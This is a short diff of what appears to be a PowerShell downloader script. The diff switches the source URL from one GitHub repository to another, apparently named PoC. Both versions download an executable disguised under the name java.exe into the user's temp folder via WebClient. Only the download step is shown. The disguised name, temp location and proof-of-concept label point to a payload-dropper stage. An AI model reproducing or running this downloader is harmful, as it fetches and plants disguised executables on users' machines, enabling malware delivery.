@@ -1,4 +1,4 @@
-$murl = "https://raw.githubusercontent.com/Reb0Rn-/MyFile/master/java.exe"
+$murl = "https://raw.githubusercontent.com/Reb0Rn-/PoC/master/java.exe"
 $moutput = "$env:TMP\java.exe"
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($murl,$moutput)
